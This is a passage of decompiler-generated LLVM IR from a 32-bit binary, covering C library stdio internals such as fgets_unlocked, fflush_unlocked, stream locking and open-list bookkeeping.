  store i32 %v23_8054a82, i32* %v2_8054a82, align 4
  store i32 %v3_8054a82, i32* %eax.global-to-local, align 4
  %v1_8054a87 = icmp eq i1 %v16_8054a82, false
  call void @__pseudo_cond_branch(i1 %v1_8054a87, i32 134564558)
  ret i32 %v3_8054a82

; uselistorder directives
  uselistorder i1 %v16_8054a82, { 1, 0 }
  uselistorder i32 %v3_8054a82, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 52, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 9, 6, 7, 5, 26, 27, 0, 10, 11, 12, 13, 14, 2, 15, 3, 1, 4 }
}

define i32 @function_8054a89() local_unnamed_addr {
dec_label_pc_8054a89:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_8054a89 = load i32, i32* @edx, align 4
  %v1_8054a89 = load i32, i32* @ebx, align 4
  %v2_8054a89 = add i32 %v1_8054a89, 64
  %v3_8054a89 = inttoptr i32 %v2_8054a89 to i32*
  store i32 %v0_8054a89, i32* %v3_8054a89, align 4
  %v0_8054a8c = load i32, i32* @ebx, align 4
  %v1_8054a8c = add i32 %v0_8054a8c, 60
  %v2_8054a8c = inttoptr i32 %v1_8054a8c to i32*
  %v3_8054a8c = load i32, i32* %v2_8054a8c, align 4
  %v4_8054a8c = add i32 %v3_8054a8c, 1
  store i32 %v4_8054a8c, i32* %v2_8054a8c, align 4
  %v0_8054a8f = load i32, i32* @ebx, align 4
  %v3_8054a98 = inttoptr i32 %tmp to i8*
  %v4_8054a98 = call i32 @__GI_fgets_unlocked(i8* %v3_8054a98, i32 %tmp1, i32 %v0_8054a8f)
  %v0_8054aa2 = load i32, i32* @esi, align 4
  %v1_8054aa2 = icmp eq i32 %v0_8054aa2, 0
  %v1_8054aa4 = icmp eq i1 %v1_8054aa2, false
  call void @__pseudo_cond_branch(i1 %v1_8054aa4, i32 134564553)
  %v0_8054aa6 = load i32, i32* @ebx, align 4
  %v1_8054aa6 = add i32 %v0_8054aa6, 60
  %v2_8054aa6 = inttoptr i32 %v1_8054aa6 to i32*
  %v3_8054aa6 = load i32, i32* %v2_8054aa6, align 4
  %v1_8054aa9 = add i32 %v3_8054aa6, -1
  %v8_8054aa9 = icmp eq i32 %v1_8054aa9, 0
  store i32 %v1_8054aa9, i32* %v2_8054aa6, align 4
  %v1_8054aaf = icmp eq i1 %v8_8054aa9, false
  call void @__pseudo_cond_branch(i1 %v1_8054aaf, i32 134564553)
  %v0_8054ab1 = load i32, i32* @ebx, align 4
  %v1_8054ab1 = add i32 %v0_8054ab1, 64
  %v2_8054ab1 = inttoptr i32 %v1_8054ab1 to i32*
  store i32 0, i32* %v2_8054ab1, align 4
  %v0_8054ab8 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054ab8 = icmp eq i32 %v0_8054ab8, 0
  call void @__pseudo_cond_branch(i1 %v1_8054ab8, i32 134564547)
  %v0_8054ac2 = load i32, i32* @ebx, align 4
  %v1_8054ac2 = add i32 %v0_8054ac2, 56
  %v2_8054ac2 = inttoptr i32 %v1_8054ac2 to i32*
  %v3_8054ac2 = load i32, i32* %v2_8054ac2, align 4
  %v4_8054ac2 = add i32 %v3_8054ac2, -1
  %v12_8054ac2 = icmp eq i32 %v4_8054ac2, 0
  store i32 %v4_8054ac2, i32* %v2_8054ac2, align 4
  %v1_8054ac7 = icmp eq i1 %v12_8054ac2, false
  call void @__pseudo_cond_branch(i1 %v1_8054ac7, i32 134564568)
  ret i32 %v1_8054aa9

; uselistorder directives
  uselistorder i32 %v4_8054ac2, { 1, 0 }
}

define i32 @function_8054ac9() local_unnamed_addr {
dec_label_pc_8054ac9:
  %v0_8054ac9 = load i32, i32* @edx, align 4
  ret i32 %v0_8054ac9
}

define i32 @_L_lock_17() local_unnamed_addr {
entry:
  %v0_8054ace = load i32, i32* @ebx, align 4
  %v1_8054ace = add i32 %v0_8054ace, 56
  store i32 %v1_8054ace, i32* @ecx, align 4
  %v0_8054ad1 = call i32 @__lll_lock_wait_private()
  %v0_8054ad6 = call i32 @function_8054a89()
  ret i32 %v0_8054ad6
}

define i32 @_L_unlock_40() local_unnamed_addr {
entry:
  %v0_8054ad8 = load i32, i32* @ebx, align 4
  %v1_8054ad8 = add i32 %v0_8054ad8, 56
  store i32 %v1_8054ad8, i32* @eax, align 4
  %v0_8054adb = call i32 @__lll_unlock_wake_private()
  %v0_8054ae0 = call i32 @function_8054ac9()
  ret i32 %v0_8054ae0
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %v0_8054ae6 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8054aed = load i32, i32* @global_var_805830c.337, align 4
  %v12_8054aed = icmp eq i32 %v0_8054aed, %v0_8054ae6
  call void @__pseudo_cond_branch(i1 %v12_8054aed, i32 ptrtoint (i32* @global_var_8054b1a.347 to i32))
  %v0_8054afc = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054afc = icmp eq i32 %v0_8054afc, 0
  call void @__pseudo_cond_branch(i1 %v1_8054afc, i32 134564615)
  %v0_8054b06 = load i32, i32* @global_var_8058304.339, align 4
  %v13_8054b06 = icmp eq i32 %v0_8054b06, 0
  %v20_8054b06 = select i1 %v13_8054b06, i32 1, i32 %v0_8054b06
  store i32 %v20_8054b06, i32* @global_var_8058304.339, align 4
  %v1_8054b0e = icmp eq i1 %v13_8054b06, false
  call void @__pseudo_cond_branch(i1 %v1_8054b0e, i32 134565347)
  ret i32 %v0_8054b06

; uselistorder directives
  uselistorder i32 %v0_8054b06, { 1, 2, 0 }
}

define i32 @function_8054b14() local_unnamed_addr {
dec_label_pc_8054b14:
  %ecx.global-to-local = alloca i32, align 4
  %v0_8054b14 = load i32, i32* @edx, align 4
  store i32 %v0_8054b14, i32* @global_var_805830c.337, align 4
  %v0_8054b1a = load i32, i32* @global_var_8058310.340, align 16
  store i32 %v0_8054b1a, i32* %ecx.global-to-local, align 4
  %v0_8054b20 = load i32, i32* @global_var_8058308.341, align 8
  %v1_8054b20 = add i32 %v0_8054b20, 1
  store i32 %v1_8054b20, i32* @global_var_8058308.341, align 8
  %v9_8054b26 = icmp eq i32 %v0_8054b1a, 1
  %v1_8054b29 = icmp eq i1 %v9_8054b26, false
  call void @__pseudo_cond_branch(i1 %v1_8054b29, i32 134564837)
  %v0_8054b2f = load i32, i32* @global_var_8058314.343, align 4
  %tmp = icmp slt i32 %v0_8054b2f, 1
  call void @__pseudo_cond_branch(i1 %tmp, i32 134564837)
  %v0_8054b3c = load i32, i32* @global_var_8058300.317, align 256
  %v1_8054b3c = load i32, i32* @edx, align 4
  %v12_8054b3c = icmp eq i32 %v0_8054b3c, %v1_8054b3c
  call void @__pseudo_cond_branch(i1 %v12_8054b3c, i32 ptrtoint (i32* @global_var_8054b64.348 to i32))
  %v0_8054b46 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054b46 = icmp eq i32 %v0_8054b46, 0
  call void @__pseudo_cond_branch(i1 %v1_8054b46, i32 134564689)
  %v0_8054b50 = load i32, i32* @global_var_80582f8.319, align 8
  %v1_8054b50 = load i32, i32* %ecx.global-to-local, align 4
  %v13_8054b50 = icmp eq i32 %v0_8054b50, 0
  %v20_8054b50 = select i1 %v13_8054b50, i32 %v1_8054b50, i32 %v0_8054b50
  store i32 %v20_8054b50, i32* @global_var_80582f8.319, align 8
  %v1_8054b58 = icmp eq i1 %v13_8054b50, false
  call void @__pseudo_cond_branch(i1 %v1_8054b58, i32 134565363)
  ret i32 %v0_8054b50

; uselistorder directives
  uselistorder i32 %v0_8054b50, { 1, 2, 0 }
}

define i32 @function_8054b5e() local_unnamed_addr {
dec_label_pc_8054b5e:
  %edx.global-to-local = alloca i32, align 4
  %v0_8054b5e = load i32, i32* @edx, align 4
  store i32 %v0_8054b5e, i32* @global_var_8058300.317, align 256
  %v0_8054b64 = load i32, i32* @global_var_80582fc.320, align 4
  %v1_8054b64 = add i32 %v0_8054b64, 1
  store i32 %v1_8054b64, i32* @global_var_80582fc.320, align 4
  %v0_8054b6a = load i32, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 8
  store i32 %v0_8054b6a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8054ba62 = icmp eq i32 %v0_8054b6a, 0
  %v1_8054ba84 = icmp eq i1 %v1_8054ba62, false
  br i1 %v1_8054ba84, label %dec_label_pc_8054b74, label %dec_label_pc_8054baa

dec_label_pc_8054b74:                             ; preds = %dec_label_pc_8054b5e, %dec_label_pc_8054ba4
  %v0_8054b84 = phi i32 [ %v0_8054ba4, %dec_label_pc_8054ba4 ], [ %v0_8054b6a, %dec_label_pc_8054b5e ]
  %v1_8054b74 = inttoptr i32 %v0_8054b84 to i16*
  %v2_8054b74 = load i16, i16* %v1_8054b74, align 2
  %v1_8054b7c = add i32 %v0_8054b84, 32
  %v2_8054b7c = inttoptr i32 %v1_8054b7c to i32*
  %v3_8054b7c = load i32, i32* %v2_8054b7c, align 4
  store i32 %v3_8054b7c, i32* @ebx, align 4
  %v1_8054b77 = and i16 %v2_8054b74, -32720
  %v6_8054b7f = icmp eq i16 %v1_8054b77, 48
  br i1 %v6_8054b7f, label %dec_label_pc_8054b88, label %dec_label_pc_8054b84

dec_label_pc_8054b84:                             ; preds = %dec_label_pc_8054b74
  store i32 %v0_8054b84, i32* @esi, align 4
  br label %dec_label_pc_8054ba4

dec_label_pc_8054b88:                             ; preds = %dec_label_pc_8054b74
  %v0_8054b88 = load i32, i32* @esi, align 4
  %v1_8054b88 = icmp eq i32 %v0_8054b88, 0
  %v1_8054b8a = icmp eq i1 %v1_8054b88, false
  br i1 %v1_8054b8a, label %dec_label_pc_8054b94, label %dec_label_pc_8054b8c

dec_label_pc_8054b8c:                             ; preds = %dec_label_pc_8054b88
  store i32 %v3_8054b7c, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 8
  br label %dec_label_pc_8054b97

dec_label_pc_8054b94:                             ; preds = %dec_label_pc_8054b88
  %v2_8054b94 = add i32 %v0_8054b88, 32
  %v3_8054b94 = inttoptr i32 %v2_8054b94 to i32*
  store i32 %v3_8054b7c, i32* %v3_8054b94, align 4
  %v0_8054b97.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054b97

dec_label_pc_8054b97:                             ; preds = %dec_label_pc_8054b8c, %dec_label_pc_8054b94
  %v0_8054b9d = phi i32 [ %v0_8054b84, %dec_label_pc_8054b8c ], [ %v0_8054b97.pre, %dec_label_pc_8054b94 ]
  %v1_8054b97 = add i32 %v0_8054b9d, 1
  %v2_8054b97 = inttoptr i32 %v1_8054b97 to i8*
  %v3_8054b97 = load i8, i8* %v2_8054b97, align 1
  %v4_8054b97 = and i8 %v3_8054b97, 32
  %v5_8054b97 = icmp eq i8 %v4_8054b97, 0
  br i1 %v5_8054b97, label %dec_label_pc_8054ba4, label %dec_label_pc_8054b9d

dec_label_pc_8054b9d:                             ; preds = %dec_label_pc_8054b97
  %v1_8054b9d = load i32, i32* @esp, align 4
  %v2_8054b9d = add i32 %v1_8054b9d, -4
  %v3_8054b9d = inttoptr i32 %v2_8054b9d to i32*
  store i32 %v0_8054b9d, i32* %v3_8054b9d, align 4
  %v1_8054b9e = call i32 @free(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054ba4

dec_label_pc_8054ba4:                             ; preds = %dec_label_pc_8054b97, %dec_label_pc_8054b84, %dec_label_pc_8054b9d
  %v0_8054ba4 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ba4, i32* %edx.global-to-local, align 4
  %v1_8054ba6 = icmp eq i32 %v0_8054ba4, 0
  %v1_8054ba8 = icmp eq i1 %v1_8054ba6, false
  br i1 %v1_8054ba8, label %dec_label_pc_8054b74, label %dec_label_pc_8054ba6.dec_label_pc_8054baa_crit_edge

dec_label_pc_8054ba6.dec_label_pc_8054baa_crit_edge: ; preds = %dec_label_pc_8054ba4
  %v0_8054baa.pre = load i32, i32* @global_var_80582fc.320, align 4
  br label %dec_label_pc_8054baa

dec_label_pc_8054baa:                             ; preds = %dec_label_pc_8054ba6.dec_label_pc_8054baa_crit_edge, %dec_label_pc_8054b5e
  %v0_8054baa = phi i32 [ %v0_8054baa.pre, %dec_label_pc_8054ba6.dec_label_pc_8054baa_crit_edge ], [ %v1_8054b64, %dec_label_pc_8054b5e ]
  %v1_8054baf = add i32 %v0_8054baa, -1
  %v8_8054baf = icmp eq i32 %v1_8054baf, 0
  store i32 %v1_8054baf, i32* @global_var_80582fc.320, align 4
  %v1_8054bb7 = icmp eq i1 %v8_8054baf, false
  call void @__pseudo_cond_branch(i1 %v1_8054bb7, i32 134564827)
  store i32 0, i32* @global_var_8058300.317, align 256
  %v0_8054bc3 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054bc3 = icmp eq i32 %v0_8054bc3, 0
  call void @__pseudo_cond_branch(i1 %v1_8054bc3, i32 134564814)
  %v0_8054bcd = load i32, i32* @global_var_80582f8.319, align 8
  %v1_8054bcd = add i32 %v0_8054bcd, -1
  %v9_8054bcd = icmp eq i32 %v1_8054bcd, 0
  store i32 %v1_8054bcd, i32* @global_var_80582f8.319, align 8
  %v1_8054bd5 = icmp eq i1 %v9_8054bcd, false
  call void @__pseudo_cond_branch(i1 %v1_8054bd5, i32 134565379)
  ret i32 %v1_8054baf

; uselistorder directives
  uselistorder i32 %v1_8054bcd, { 1, 0 }
  uselistorder i32 %v0_8054ba4, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 8, 7, 6, 14, 5, 4, 3, 2, 1, 0, 13, 12, 11, 15, 10, 9 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 86, 129, 130, 94, 131, 132, 133, 134, 84, 85, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 137, 138, 139, 140, 141, 142, 143, 144, 135, 136, 145, 146, 81, 82, 83, 147, 148, 149, 150, 151, 152, 153 }
  uselistorder i8 32, { 28, 29, 30, 9, 10, 12, 11, 13, 14, 15, 16, 0, 1, 2, 17, 3, 4, 5, 18, 6, 7, 19, 20, 23, 24, 21, 25, 26, 27, 8, 22 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder i32* bitcast (i32** @global_var_8057c18.322 to i32*), { 2, 3, 0, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_8054ba4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054b97, { 1, 0 }
  uselistorder label %dec_label_pc_8054b74, { 1, 0 }
}

define i32 @function_8054bdb() local_unnamed_addr {
dec_label_pc_8054bdb:
  store i32 0, i32* @global_var_8058314.343, align 4
  %v0_8054be5 = load i32, i32* @global_var_8058310.340, align 16
  %v1_8054bea = add i32 %v0_8054be5, -1
  store i32 %v1_8054bea, i32* @global_var_8058310.340, align 16
  %v0_8054bf0 = load i32, i32* @global_var_8058308.341, align 8
  %v1_8054bf5 = add i32 %v0_8054bf0, -1
  %v8_8054bf5 = icmp eq i32 %v1_8054bf5, 0
  store i32 %v1_8054bf5, i32* @global_var_8058308.341, align 8
  %v1_8054bfd = icmp eq i1 %v8_8054bf5, false
  call void @__pseudo_cond_branch(i1 %v1_8054bfd, i32 134564897)
  store i32 0, i32* @global_var_805830c.337, align 4
  %v0_8054c09 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054c09 = icmp eq i32 %v0_8054c09, 0
  call void @__pseudo_cond_branch(i1 %v1_8054c09, i32 134564884)
  %v0_8054c13 = load i32, i32* @global_var_8058304.339, align 4
  %v1_8054c13 = add i32 %v0_8054c13, -1
  %v9_8054c13 = icmp eq i32 %v1_8054c13, 0
  store i32 %v1_8054c13, i32* @global_var_8058304.339, align 4
  %v1_8054c1b = icmp eq i1 %v9_8054c13, false
  call void @__pseudo_cond_branch(i1 %v1_8054c1b, i32 134565395)
  ret i32 %v1_8054bf5

; uselistorder directives
  uselistorder i32 %v1_8054c13, { 1, 0 }
}

define i32 @function_8054c21() local_unnamed_addr {
dec_label_pc_8054c21:
  %v0_8054c23 = load i32, i32* @eax, align 4
  ret i32 %v0_8054c23
}

define i32 @fflush_unlocked(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v9_8054c2c = icmp eq i32 %arg1, 134577176
  %v1_8054c32 = icmp eq i1 %v9_8054c2c, false
  br i1 %v1_8054c32, label %dec_label_pc_8054c3a, label %dec_label_pc_8054c34

dec_label_pc_8054c34:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8054c47

dec_label_pc_8054c3a:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v1_8054c3f = icmp eq i32 %arg1, 0
  %v1_8054c41 = icmp eq i1 %v1_8054c3f, false
  call void @__pseudo_cond_branch(i1 %v1_8054c41, i32 134565307)
  br label %dec_label_pc_8054c47

dec_label_pc_8054c47:                             ; preds = %dec_label_pc_8054c34, %dec_label_pc_8054c3a
  %v0_8054c47 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_8054c47, i32* @esi, align 4
  %v0_8054c4e = load i32, i32* @global_var_805830c.337, align 4
  %v12_8054c4e = icmp eq i32 %v0_8054c4e, %v0_8054c47
  call void @__pseudo_cond_branch(i1 %v12_8054c4e, i32 ptrtoint (i32* @global_var_8054c7b.349 to i32))
  %v0_8054c5b = load i32, i32* @ebx, align 4
  %v0_8054c5d = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054c5d = icmp eq i32 %v0_8054c5d, 0
  call void @__pseudo_cond_branch(i1 %v1_8054c5d, i32 134564968)
  %v0_8054c67 = load i32, i32* @global_var_8058304.339, align 4
  %v13_8054c67 = icmp eq i32 %v0_8054c5b, %v0_8054c67
  %v20_8054c67 = select i1 %v13_8054c67, i32 1, i32 %v0_8054c67
  store i32 %v20_8054c67, i32* @global_var_8058304.339, align 4
  %v1_8054c6f = icmp eq i1 %v13_8054c67, false
  call void @__pseudo_cond_branch(i1 %v1_8054c6f, i32 134565411)
  ret i32 %v0_8054c67

; uselistorder directives
  uselistorder i32 %v0_8054c67, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054c47, { 1, 0 }
}

define i32 @function_8054c75() local_unnamed_addr {
dec_label_pc_8054c75:
  %v0_8054c75 = load i32, i32* @esi, align 4
  store i32 %v0_8054c75, i32* @global_var_805830c.337, align 4
  %v0_8054c7b = load i32, i32* @global_var_8058310.340, align 16
  %v0_8054c80 = load i32, i32* @global_var_8058308.341, align 8
  %v1_8054c86 = add i32 %v0_8054c7b, 1
  %v1_8054c87 = icmp eq i32 %v0_8054c80, 0
  store i32 %v1_8054c86, i32* @global_var_8058310.340, align 16
  %v1_8054c8e = icmp eq i1 %v1_8054c87, false
  call void @__pseudo_cond_branch(i1 %v1_8054c8e, i32 ptrtoint ([3 x i8]* @global_var_8054cb2.350 to i32))
  store i32 0, i32* @global_var_805830c.337, align 4
  %v0_8054c9a = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054c9a = icmp eq i32 %v0_8054c9a, 0
  call void @__pseudo_cond_branch(i1 %v1_8054c9a, i32 134565029)
  %v0_8054ca4 = load i32, i32* @global_var_8058304.339, align 4
  %v1_8054ca4 = add i32 %v0_8054ca4, -1
  %v9_8054ca4 = icmp eq i32 %v1_8054ca4, 0
  store i32 %v1_8054ca4, i32* @global_var_8058304.339, align 4
  %v1_8054cac = icmp eq i1 %v9_8054ca4, false
  call void @__pseudo_cond_branch(i1 %v1_8054cac, i32 134565427)
  ret i32 %v1_8054c86

; uselistorder directives
  uselistorder i32 %v1_8054ca4, { 1, 0 }
}

define i32 @function_8054cb2() local_unnamed_addr {
dec_label_pc_8054cb2:
  %v0_8054cb2 = load i32, i32* @global_var_8058300.317, align 256
  %v1_8054cb2 = load i32, i32* @esi, align 4
  %v12_8054cb2 = icmp eq i32 %v0_8054cb2, %v1_8054cb2
  call void @__pseudo_cond_branch(i1 %v12_8054cb2, i32 ptrtoint (i32* @global_var_8054cdf.351 to i32))
  %v0_8054cbf = load i32, i32* @ebx, align 4
  %v0_8054cc1 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054cc1 = icmp eq i32 %v0_8054cc1, 0
  call void @__pseudo_cond_branch(i1 %v1_8054cc1, i32 134565068)
  %v0_8054ccb = load i32, i32* @global_var_80582f8.319, align 8
  %v13_8054ccb = icmp eq i32 %v0_8054cbf, %v0_8054ccb
  %v20_8054ccb = select i1 %v13_8054ccb, i32 1, i32 %v0_8054ccb
  store i32 %v20_8054ccb, i32* @global_var_80582f8.319, align 8
  %v1_8054cd3 = icmp eq i1 %v13_8054ccb, false
  call void @__pseudo_cond_branch(i1 %v1_8054cd3, i32 134565443)
  ret i32 %v0_8054ccb

; uselistorder directives
  uselistorder i32 %v0_8054ccb, { 0, 2, 1 }
}

define i32 @function_8054cd9() local_unnamed_addr {
dec_label_pc_8054cd9:
  %v0_8054cd9 = load i32, i32* @esi, align 4
  store i32 %v0_8054cd9, i32* @global_var_8058300.317, align 256
  %v0_8054cdf = load i32, i32* @global_var_80582fc.320, align 4
  %v1_8054cea = icmp eq i32 %v0_8054cdf, 0
  %v1_8054cec = icmp eq i1 %v1_8054cea, false
  call void @__pseudo_cond_branch(i1 %v1_8054cec, i32 134565136)
  store i32 0, i32* @global_var_8058300.317, align 256
  %v0_8054cf8 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054cf8 = icmp eq i32 %v0_8054cf8, 0
  call void @__pseudo_cond_branch(i1 %v1_8054cf8, i32 134565123)
  %v0_8054d02 = load i32, i32* @global_var_80582f8.319, align 8
  %v1_8054d02 = add i32 %v0_8054d02, -1
  %v9_8054d02 = icmp eq i32 %v1_8054d02, 0
  store i32 %v1_8054d02, i32* @global_var_80582f8.319, align 8
  %v1_8054d0a = icmp eq i1 %v9_8054d02, false
  call void @__pseudo_cond_branch(i1 %v1_8054d0a, i32 134565459)
  ret i32 %v0_8054cdf

; uselistorder directives
  uselistorder i32 %v1_8054d02, { 1, 0 }
  uselistorder i32* @global_var_80582fc.320, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
}

define i32 @function_8054d10() local_unnamed_addr {
dec_label_pc_8054d10:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  %v0_8054d12 = call i32 @function_8054dac()
  store i32 %v0_8054d12, i32* %eax.global-to-local, align 4
  %v0_8054d17 = load i32, i32* @ebx, align 4
  %v1_8054d17 = inttoptr i32 %v0_8054d17 to i8*
  %v2_8054d17 = load i8, i8* %v1_8054d17, align 1
  %v3_8054d17 = and i8 %v2_8054d17, 64
  %v4_8054d17 = icmp eq i8 %v3_8054d17, 0
  call void @__pseudo_cond_branch(i1 %v4_8054d17, i32 134565289)
  %v0_8054d20 = load i32, i32* @global_var_8057c1c.344, align 4
  %v9_8054d20 = icmp eq i32 %v0_8054d20, 2
  call void @__pseudo_cond_branch(i1 %v9_8054d20, i32 134565200)
  %v0_8054d29 = load i32, i32* @ebx, align 4
  %v1_8054d29 = add i32 %v0_8054d29, 64
  %v2_8054d29 = inttoptr i32 %v1_8054d29 to i32*
  %v3_8054d29 = load i32, i32* %v2_8054d29, align 4
  %v4_8054d29 = load i32, i32* @esi, align 4
  %v15_8054d29 = icmp eq i32 %v3_8054d29, %v4_8054d29
  call void @__pseudo_cond_branch(i1 %v15_8054d29, i32 134565197)
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v0_8054d35 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054d35 = icmp eq i32 %v0_8054d35, 0
  call void @__pseudo_cond_branch(i1 %v1_8054d35, i32 134565184)
  %v0_8054d3f = load i32, i32* @ebx, align 4
  %v1_8054d3f = add i32 %v0_8054d3f, 56
  %v2_8054d3f = inttoptr i32 %v1_8054d3f to i32*
  %v3_8054d3f = load i32, i32* %v2_8054d3f, align 4
  %v4_8054d3f = load i32, i32* %ecx.global-to-local, align 4
  %v5_8054d3f = load i32, i32* %eax.global-to-local, align 4
  %v16_8054d3f = icmp eq i32 %v5_8054d3f, %v3_8054d3f
  %v23_8054d3f = select i1 %v16_8054d3f, i32 %v4_8054d3f, i32 %v3_8054d3f
  store i32 %v23_8054d3f, i32* %v2_8054d3f, align 4
  store i32 %v3_8054d3f, i32* %eax.global-to-local, align 4
  %v1_8054d44 = icmp eq i1 %v16_8054d3f, false
  call void @__pseudo_cond_branch(i1 %v1_8054d44, i32 134565475)
  ret i32 %v3_8054d3f

; uselistorder directives
  uselistorder i1 %v16_8054d3f, { 1, 0 }
  uselistorder i32 %v3_8054d3f, { 1, 0, 3, 2 }
  uselistorder i8 64, { 2, 3, 4, 5, 0, 1 }
}

define i32 @function_8054d4a() local_unnamed_addr {
dec_label_pc_8054d4a:
  %v0_8054d4a = load i32, i32* @esi, align 4
  %v1_8054d4a = load i32, i32* @ebx, align 4
  %v2_8054d4a = add i32 %v1_8054d4a, 64
  %v3_8054d4a = inttoptr i32 %v2_8054d4a to i32*
  store i32 %v0_8054d4a, i32* %v3_8054d4a, align 4
  %v0_8054d4d = load i32, i32* @ebx, align 4
  %v1_8054d4d = add i32 %v0_8054d4d, 60
  %v2_8054d4d = inttoptr i32 %v1_8054d4d to i32*
  %v3_8054d4d = load i32, i32* %v2_8054d4d, align 4
  %v4_8054d4d = add i32 %v3_8054d4d, 1
  store i32 %v4_8054d4d, i32* %v2_8054d4d, align 4
  %v0_8054d50 = load i32, i32* @ebp, align 4
  %v1_8054d52 = load i32, i32* @ebx, align 4
  %v2_8054d52 = inttoptr i32 %v1_8054d52 to i32*
  %v3_8054d52 = load i32, i32* %v2_8054d52, align 4
  %v4_8054d52 = or i32 %v3_8054d52, %v0_8054d50
  %v2_8054d54 = urem i32 %v4_8054d52, 65536
  %v9_8054d54 = and i32 %v2_8054d54, 832
  %v2_8054d58 = icmp eq i32 %v9_8054d54, 320
  %v1_8054d5d = icmp eq i1 %v2_8054d58, false
  br i1 %v1_8054d5d, label %dec_label_pc_8054d79, label %dec_label_pc_8054d5f

dec_label_pc_8054d5f:                             ; preds = %dec_label_pc_8054d4a
  %v1_8054d60 = call i32 @__stdio_wcommit(i32 %v1_8054d52)
  %v1_8054d66 = icmp eq i32 %v1_8054d60, 0
  br i1 %v1_8054d66, label %dec_label_pc_8054d6f, label %dec_label_pc_8054d6a

dec_label_pc_8054d6a:                             ; preds = %dec_label_pc_8054d5f
  br label %dec_label_pc_8054d79

dec_label_pc_8054d6f:                             ; preds = %dec_label_pc_8054d5f
  %v0_8054d6f = load i32, i32* @ebx, align 4
  %v1_8054d6f = inttoptr i32 %v0_8054d6f to i16*
  %v2_8054d6f = load i16, i16* %v1_8054d6f, align 2
  %v3_8054d6f = and i16 %v2_8054d6f, -65
  store i16 %v3_8054d6f, i16* %v1_8054d6f, align 2
  %v0_8054d73 = load i32, i32* @ebx, align 4
  %v1_8054d73 = add i32 %v0_8054d73, 8
  %v2_8054d73 = inttoptr i32 %v1_8054d73 to i32*
  %v3_8054d73 = load i32, i32* %v2_8054d73, align 4
  %v2_8054d76 = add i32 %v0_8054d73, 28
  %v3_8054d76 = inttoptr i32 %v2_8054d76 to i32*
  store i32 %v3_8054d73, i32* %v3_8054d76, align 4
  br label %dec_label_pc_8054d79

dec_label_pc_8054d79:                             ; preds = %dec_label_pc_8054d4a, %dec_label_pc_8054d6a, %dec_label_pc_8054d6f
  %v0_8054d79 = load i32, i32* @global_var_8057c1c.344, align 4
  %v9_8054d79 = icmp eq i32 %v0_8054d79, 2
  call void @__pseudo_cond_branch(i1 %v9_8054d79, i32 134565289)
  %v0_8054d82 = load i32, i32* @ebx, align 4
  %v1_8054d82 = add i32 %v0_8054d82, 60
  %v2_8054d82 = inttoptr i32 %v1_8054d82 to i32*
  %v3_8054d82 = load i32, i32* %v2_8054d82, align 4
  %v1_8054d85 = add i32 %v3_8054d82, -1
  %v8_8054d85 = icmp eq i32 %v1_8054d85, 0
  store i32 %v1_8054d85, i32* %v2_8054d82, align 4
  %v1_8054d8b = icmp eq i1 %v8_8054d85, false
  call void @__pseudo_cond_branch(i1 %v1_8054d8b, i32 134565289)
  %v0_8054d8d = load i32, i32* @ebx, align 4
  %v1_8054d8d = add i32 %v0_8054d8d, 64
  %v2_8054d8d = inttoptr i32 %v1_8054d8d to i32*
  store i32 0, i32* %v2_8054d8d, align 4
  %v0_8054d94 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054d94 = icmp eq i32 %v0_8054d94, 0
  call void @__pseudo_cond_branch(i1 %v1_8054d94, i32 134565279)
  %v0_8054d9e = load i32, i32* @ebx, align 4
